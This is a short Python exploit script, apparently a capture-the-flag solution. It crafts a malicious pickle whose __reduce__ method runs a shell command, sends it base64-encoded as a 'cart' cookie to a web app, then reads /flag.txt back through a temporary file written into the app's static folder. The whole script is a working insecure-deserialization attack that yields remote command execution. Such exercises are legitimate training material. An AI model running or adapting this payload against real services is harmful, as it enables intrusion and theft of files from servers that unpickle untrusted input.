import pickle
import base64
import os
import sys
import requests

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000"
EXFIL_PATH = "static/pwned.txt"      # relative to /app inside the container
EXFIL_URL  = f"{TARGET}/{EXFIL_PATH}"
CMD = f"sh -c 'cat /flag.txt > {EXFIL_PATH} ; sleep 2 ; rm {EXFIL_PATH}' &"


class Exploit:
	# __reduce__ is called when unpickling an object
    def __reduce__(self):
        return (os.system, (CMD,))

exploit = Exploit()
raw = pickle.dumps(exploit)
evil_cookie = base64.b64encode(raw).decode()

resp1 = requests.get(f"{TARGET}/cart", cookies={"cart": evil_cookie})
resp1.raise_for_status()

resp2 = requests.get(EXFIL_URL)
resp2.raise_for_status()
print(resp2.text.strip())
